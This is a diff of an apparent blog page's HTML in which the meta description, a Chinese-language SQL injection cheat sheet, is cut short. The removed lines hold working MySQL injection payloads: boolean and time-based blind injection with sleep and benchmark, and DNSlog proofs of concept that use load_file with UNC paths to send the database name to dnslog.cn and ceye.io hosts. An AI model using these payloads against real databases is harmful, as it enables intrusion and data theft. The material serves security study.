@@ -12,65 +12,7 @@
   <meta name="description" content="UNION注入
 Select col form table union select database();
 
-如果前面的值为空，只返回后面的结果。如若查询结果只能显示一条，可以用limit 0,1 或select group_concat(col)进行拼接
-盲注
-返回true或false
-
-1&amp;#39;%20and%20ascii(substr((select%20database()),1,1))&amp;gt;115--+
-通过ascii字符截取判断
-
-select * from users order by rand(True)
- select * from users order by rand(False)
-
-
-返回的结果不同，利用rand(database()=’users’).
-
-时间盲注
-
-利用sleep()
-id=&amp;#39; or if(ascii(substr(database(),1,1))&amp;gt;114,sleep(3),0)%23
-
-if(exp,sleep(3),0)，根据返回的时间来判断exp中是否为真；
-
-利用大量运算模拟sleep()
-id=&amp;#39; or if(ascii(substr(database(),1,1))&amp;gt;114,benchmark(10000000,sha(1)),0)%23
-
-通过笛卡尔积
-select balabala from table1 where &amp;#39;1&amp;#39;=&amp;#39;2&amp;#39; or if(ascii(substr(database(),1,1))&amp;gt;0,(select count(*) from information_schema.tables A,information_schema.tables B,information_schema.tables C),0)
-
-rlike+rpad
-rpad(1,349525,a)是指用a填充第一位的字符串以达到第二位的长度
-
-select * from table1 where 1=1 and if(mid(user(),1,1)=&amp;#39;r&amp;#39;,concat(rpad(1,349525,&amp;#39;a&amp;#39;),rpad(1,349525,&amp;#39;a&amp;#39;),rpad(1,349525,&amp;#39;a&amp;#39;)) RLIKE &amp;#39;(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+(a.*)+asdasdsadasd&amp;#39;,1);
-
-DNSlog无回显盲注
-需要windows平台
-
-在mysql中load_file会带dns查询请求
-
-查看变量确定权限
-
-`show variables like &amp;#39;%secure%&amp;#39;`
-
-   1、当secure_file_priv为空，就可以读取磁盘的目录。
-
-   2、当secure_file_priv为G:\，就可以读取G盘的文件。
-
-   3、当secure_file_priv为null，load_file就不能加载文件。
-
-需要secure_file_priv=&amp;quot;&amp;quot;
-
-5.5.34版本后默认为null，可以在my.ini中修改
-
-unc共享路径  `\\\\xq17.com\tet，\\\\转义后为\\`
-
-dnslog平台：http://dnslog.cn/
-
-poc :`&amp;#39; and if((select load_file(concat(&amp;#39;\\\\&amp;#39;,(select database()),&amp;#39;.xxxx.ceye.io\\abc&amp;#39;))),1,0)--+`
-
-poc :`select load_file(concat(&amp;#39;\\\\&amp;#39;,(select database()),&amp;#39;.f9bbk4.dnslog.cn\\abc&amp;#39;));`
-
-注:域名后必须加\\\abc"> 
+如果前面的值为空，只返回后面的结果。如若查询结果只能显示一条，可以用limit 0,1 或select group_concat(col)进行拼接"> 
   
   
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
@@ -182,6 +124,7 @@ poc :`select load_file(concat(&amp;#39;\\\\&amp;#39;,(select database()),&amp;#3
 <li><code>Select col form table union select database();</code></li>
 </ul>
 <p>如果前面的值为空，只返回后面的结果。<br>如若查询结果只能显示一条，可以用limit 0,1 或select group_concat(col)进行拼接</p>
+<a id="more"></a>
 <h2 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h2><ul>
 <li>返回true或false</li>
 </ul>
@@ -193,6 +136,7 @@ poc :`select load_file(concat(&amp;#39;\\\\&amp;#39;,(select database()),&amp;#3
 </li>
 </ul>
 <p>返回的结果不同，利用rand(database()=’users’).</p>
+<!-- more -->
 <ul>
 <li><p>时间盲注</p>
 <ul>
